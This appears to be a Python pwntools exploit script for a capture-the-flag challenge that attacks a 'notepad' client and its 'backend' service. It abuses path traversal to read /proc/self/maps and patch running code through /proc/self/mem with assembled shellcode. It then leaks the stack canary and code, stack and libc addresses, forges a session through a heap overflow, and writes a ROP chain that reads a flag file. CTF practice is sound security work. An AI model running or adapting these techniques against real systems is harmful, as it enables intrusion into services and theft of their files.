from pwn import *
import time 
context.arch = 'amd64'

p = process('./backend')
r = process('./notepad')
#r = remote('10.113.184.121',25395)
def login(username,password):
    r.sendlineafter(b'> ',b'1')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)

def register(username,password):
    r.sendlineafter(b'> ',b'2')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)    

def new_note(name,length,content):
    r.sendlineafter(b'> ',b'3')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Content Length: ',str(length).encode())
    r.sendafter(b'Content: ',content)

def edit_note(name,offset,length,content):
    r.sendlineafter(b'> ',b'4')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())
    r.sendlineafter(b'Content Length: ',str(length).encode())
    r.sendafter(b'Content: ',content)

def show_note(name,offset):
    r.sendlineafter(b'> ',b'5')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())

def read_file(filename,offset):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    show_note(path,offset)
    return r.recv(128)
def write_file(filename,offset,length,content):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    edit_note(path,offset,length,content)


register(b'b\x00',b'b\x00')
login(b'b',b'b')


heap_base = int(read_file(b'/proc/self/maps',0)[:12],16)
print(hex(heap_base))

payload = asm(
    '''

    mov rdx, r11
              
    ''')
payload = b'\x90'*12 + payload
write_file(b'/proc/self/mem',heap_base+0x1cb9,len(payload),payload) ### patch edit_note

payload = asm(
    '''
        mov r8, rdi
    read_stdin:
        xor rax, rax
        xor rdi, rdi
        mov rsi, rsp 
        mov rdx, 0xa4
        syscall
    write_socket:
        xor rax, rax
        inc rax
        mov rdi, r8
        mov rsi, rsp
        mov rdx, 0xa4
        syscall
    read_socket:
        xor rax, rax
        mov rdi, r8
        mov rsi, rsp 
        mov rdx, 0x104
        syscall 
    write_stdout:   
        xor rax, rax 
        inc rax
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 0x104
        syscall
        leave 
        ret
    ''')
write_file(b'/proc/self/mem',heap_base+0x158c,len(payload),payload) # patch login for connecting backend


payload = asm(
    '''
        push rbp
        mov rbp, rsp
        sub rsp, 0x1e0
        mov r8, rdi
    read_socket:
        xor rax, rax
        mov rdi, r8
        mov rsi, rsp 
        mov rdx, 0x104
        syscall 
    write_stdout:   
        xor rax, rax 
        inc rax
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 0x104
        syscall
        leave 
        ret
    ''')
write_file(b'/proc/self/mem',heap_base+0x1735,len(payload),payload)

def send_backend(payload):
    login(b'1',b'1')
    r.send(payload)
    output = r.recv(0x104)
    return output


# r.wait(0.1)
payload = p32(1) + b'\x00' * 0x20 + b'123\x00' + b'123\x00'
send_backend(payload.ljust(0x60,b'\x00'))

# r.wait(0.1)
payload = p32(0x8787)  ## leave information in stack 
send_backend(payload)

# r.wait(0.1)
payload = p32(2) + b'\x00' * 0x20 + b'123\x00' + b'123\x00'  ## login to leak using command_login
leak = send_backend(payload.ljust(0x60,b'\x00'))
#print(leak)
canary = u64(leak[0x98:0x98+8])
print(hex(canary))

stack =  u64(leak[0xd8:0xd8+8]) + 0x30 # stack read head
print(hex(stack))

code_base = u64(leak[0xe8:0xe8+8]) - 0x1e13
print(hex(code_base))

token = leak[4:4+0x20]
print(token)
payload = p32(0x11) + token + b'a'*0x21 + p64(stack+0x30) # heap overflow to overwrite session->next
# r.wait(0.1)
send_backend(payload)
'''
struct Session
{
  int64_t user;
  time_t time;
  u_char token[32];
  Session *next;
};

struct User
{
  u_char username[16];
  u_char password[16];
  u_char path[128];
  int count;
  User *next;
};

'''
libc_start_main_stack = stack + 0x218

fake_token = b'\x41'.ljust(0x20,b'\x00')
fake_session = p64(libc_start_main_stack - 0x20) + p64(int(time.time())-60) + fake_token 
payload = p32(0x11) + b'\x41'.ljust(0x1c,b'\x00') + b'\x00' * 0x10 + fake_session
# r.wait(0.1)
libc = u64(send_backend(payload)[4:4+8]) - 0x29d90
print(hex(libc))

pop_rax_ret = libc + 0x45eb0
pop_rdi_ret = libc + 0x02a3e5
pop_rsi_ret = libc + 0x2be51 
pop_rdx_r12_ret = libc + 0x11f497
sys_ret = libc + 0x91396
pop_rbp_ret = libc + 0x2a2e0
libc_sleep = libc+ 0xea5e0

def write_gadget(addr,old,new):
    fake_token = b'\x41'.ljust(0x20,b'\x00')
    fake_session = p64(libc_start_main_stack - 0x20) + p64(int(time.time())-60) + fake_token + p64(addr)
    payload = p32(0x12) + p64(old).ljust(0x1c,b'\x00') + b'\x00' * 0x5 + p64(new) + b'\x00' * 0x3 + fake_session + b'\x41' * 0x8 + b'/flag_backend'
    # r.wait(0.2)
    return send_backend(payload)

start_addr = code_base+0x5600

rop_gadget = [
    pop_rdi_ret, 0x45, pop_rax_ret, 3, sys_ret,
    pop_rdi_ret, stack+0x70, pop_rsi_ret, 0, pop_rdx_r12_ret, 0, 0, pop_rax_ret, 2, sys_ret, # open
    pop_rdi_ret, 0x45, pop_rsi_ret, code_base + 0x5830, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 0, sys_ret, #read 
    pop_rdi_ret, 1, libc_sleep,
    pop_rdi_ret, 3, pop_rsi_ret, stack + 0x1f0, pop_rdx_r12_ret, stack+0x1d4, 0, pop_rax_ret, 0x2b, sys_ret, #accept
    pop_rdi_ret, 0x46, pop_rsi_ret, code_base + 0x5830, pop_rdx_r12_ret, 100, 0, pop_rax_ret, 1, sys_ret,
    pop_rdi_ret, 0x46, pop_rax_ret, 3, sys_ret,
]



rop_gadget = rop_gadget[::-1]
for i in rop_gadget:
    write_gadget(start_addr,0,i)
    start_addr -=8

#write_gadget(start_addr,0,code_base+0x55b0)
write_gadget(start_addr-0x7,0,canary>>8)
#input()

input()
b = write_gadget(stack-0x220,stack-0x30,start_addr+0x10)
# a = r.recv(100)
print(b)
# print(a)
r.wait(3)
register(b'123',b'123')
print(r.recv(0xa4))
r.interactive()